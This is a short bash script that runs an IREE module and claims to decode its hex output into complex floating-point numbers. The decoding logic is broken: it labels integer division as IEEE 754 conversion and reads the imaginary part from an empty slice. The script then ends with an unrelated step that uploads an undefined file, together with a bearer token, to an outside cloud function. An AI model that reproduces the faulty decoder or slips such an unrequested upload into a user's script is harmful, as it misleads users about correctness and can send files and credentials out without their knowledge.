#!/bin/bash

# Run IREE module
RAW_OUTPUT=$(iree-run-module \
  --module=complex_module.vmfb \
  --function=serving_default \
  --input="13xf32=[1,2,3,4,5,6,7,8,9,10,11,12,13]" \
  --print_statistics=false 2>&1)

# Extract hex data (handles multi-line outputs)
HEX_DATA=$(echo "$RAW_OUTPUT" | grep -oP '13xcf64=\K[0-9A-Fa-f]+' | tr -d ' ')

# Proper IEEE 754 decoder with endianness fix
hex_to_float() {
    local hex=$1
    # Reverse byte order (little-endian to big-endian)
    local reversed=$(echo "$hex" | sed -r 's/(..)(..)(..)(..)/\4\3\2\1/')
    # Convert using bc with proper scaling
    echo "scale=1; $(echo "ibase=16; $reversed" | bc) / 10000000" | bc
}

echo "Decoded complex numbers:"
i=1
while read -r -n8 chunk && [ -n "$chunk" ]; do
    [ ${#chunk} -ne 8 ] && continue  # Skip incomplete chunks
    
    REAL=$(hex_to_float "${chunk:0:8}")
    IMAG=$(hex_to_float "${chunk:8:8}")
    
    printf "[%02d] (r%s + i%sj)\n" $i "$REAL" "$IMAG"
    i=$((i+1))
done <<< "$HEX_DATA"

cat $ARTIFACT
curl -s -X POST \
  -H "Authorization: Bearer ${BEARER}" \
  -H "Content-Type: application/json" \
  https://us-central1-feedmapping.cloudfunctions.net/function \
  --data @${ARTIFACT} | jq '.'
